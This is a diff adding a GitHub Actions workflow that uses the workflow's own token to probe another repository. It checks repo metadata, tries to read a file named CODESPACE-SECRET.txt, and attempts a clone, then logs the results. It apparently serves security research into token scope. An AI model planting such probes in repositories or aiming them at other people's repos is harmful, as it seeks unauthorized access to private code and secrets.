@@ -1,0 +1,20 @@
+name: crossrepo-token-probe3
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          TOK="${{ github.token }}"
+          code=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $TOK" https://api.github.com/repos/s3rdz0x1337/codespace-target-1789121382)
+          echo "MARK repo-meta HTTP=$code"
+          codec=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: token $TOK" https://api.github.com/repos/s3rdz0x1337/codespace-target-1789121382/contents/CODESPACE-SECRET.txt)
+          echo "MARK contents HTTP=$codec"
+          if git clone --depth 1 "https://x-access-token:$TOK@github.com/s3rdz0x1337/codespace-target-1789121382" /tmp/clone 2>/tmp/e; then
+            echo "MARK CLONE=SUCCESS"; ls /tmp/clone | sed 's/^/MARK file: /'
+          else
+            echo "MARK CLONE=FAIL"; sed 's/^/MARK git: /;s/'"$TOK"'/REDACTED/g' /tmp/e | head -3
+          fi
